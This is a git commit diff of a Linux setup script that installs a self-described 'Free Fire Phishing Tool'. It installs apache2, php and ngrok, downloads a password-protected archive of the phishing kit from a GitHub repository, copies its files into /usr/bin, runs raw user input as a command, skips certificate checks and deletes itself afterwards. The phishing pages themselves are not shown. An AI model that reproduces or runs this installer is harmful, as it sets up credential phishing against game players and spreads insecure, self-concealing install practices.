9f3defc0b933ab197ad93c538a154713d2256a0b
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2021-09-20 09:42:23 +0530

    Update Linux-Setup.sh

--- OnlineHacking/SUMAN/FreeFire/SM/Files/Linux-Setup.sh
+++ OnlineHacking/SUMAN/FreeFire/SM/Files/Linux-Setup.sh
@@ -2,6 +2,57 @@
 echo ""
 clear
 echo ""
+echo -e ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
+echo ""
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Run Ngrok  "
+sleep 5
+clear
+echo ""
+echo ""
+echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Script for Android \e[m \e[21"
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/v/7ue43a  "
+echo ""
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Video Watching Complete ? \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'N'* ]]; then
+clear
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
+clear
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
 echo -e ""
@@ -12,38 +63,34 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo ""
 echo -e ""
 echo -e "\e[33m
-         
-         ██╗  ██╗███████╗██╗   ██╗
-         ██║ ██╔╝██╔════╝╚██╗ ██╔╝
-         █████╔╝ █████╗   ╚████╔╝ 
-         ██╔═██╗ ██╔══╝    ╚██╔╝  
-         ██║  ██╗███████╗   ██║   
-         ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
+      ██╗  ██╗███████╗██╗   ██╗
+      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
+      █████╔╝ █████╗   ╚████╔╝
+      ██╔═██╗ ██╔══╝    ╚██╔╝
+      ██║  ██╗███████╗   ██║
+      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
 echo ""
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/OHSMFF  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/  "
 echo ""
 echo ""
-read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Admin Activation Key : \e[0m' option
+read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' option
 echo""
 echo""
 echo""
-
-if [[ $option == *'9DY7VHT1JKVBMYJC'* ]]; then
+if [[ $option == *''* ]]; then
 clear
 echo ""
 echo ""
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
-sleep 2
-clear
-echo ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
 echo ""
 sudo apt-get install apache2 -y
 apt install php -y
@@ -57,51 +104,101 @@ apt install gem -y
 gem install lolcat
 apt install gnome-terminal -y
 clear
+echo""
+echo -e "\e[1;96m========================================================= > > >\e[m "
+echo " "
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Install Ngrok Old Version \e[0m \e[93m Customise  \e[0m  "  
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
+echo
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Install Ngrok Latest Version \e[0m   "  
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
+echo " "
+echo -e "\e[1;96m========================================================= > > >\e[m "
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Want to Choose Ngrok Version : \e[1;91m (default:1) : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'2'* ]]; then
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok
+fi
+if [[ $option == *'1'* ]]; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
 unzip ngrok-stable-linux-amd64.zip
+rm -rf unzip ngrok-stable-linux-amd64.zip
+fi
+echo""
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
 wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar
 unrar x -Password SUMAN.rar
-rm -rf ngrok-stable-linux-amd64.zip SUMAN.rar
+rm -rf SUMAN.rar
+chmod +x ngrok
+chmod +x FreeFire
+chmod +x Run-Ngrok
+clear
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+sleep 1
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep1
+echo
 cp -R ngrok SUMAN/1/
 cp -R ngrok SUMAN/2/
 cp -R ngrok SUMAN/3/
 cp -R ngrok SUMAN/4/
 cp -R ngrok SUMAN/5/
 cp -R ngrok SUMAN/6/
-chmod 7777 OnlineHacking-Phishing
+chmod 7777 FreeFire-Phishing
 clear
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
-echo ""
-sleep 1
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
-sleep2
 echo
 clear
+echo
+echo
+cp -R ngrok /usr/bin/
+cp -R SUMAN /usr/bin/
+cp -R FreeFire /usr/bin/
+cp -R FreeFire-Phishing /usr/bin/
+cp -R Run-Ngrok /usr/bin/
+cp -R OnlineHacking /usr/bin/
+echo
+rm -rf SUMAN FreeFire-Phishing
+echo
 echo -e "\e[35m[+] Connect Online Hacking Free Fire Hacking Server......  \e[m "
-sleep 4
-echo 
-echo 
+sleep 2
+echo
+echo
 clear
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 sleep 4
-echo 
-echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Script for Linux \e[m \e[21"
-echo 
-echo 
-echo -e "\e[92m[+] To run the tool type :\e[93m ./OnlineHacking-Phishing \e[m "
-echo 
-
-
-
-
+echo
+echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
+echo
+echo
+echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
+echo
 fi
-
 sleep 3
-echo 
+echo
+rm -rf Linux-Setup.sh
 exit
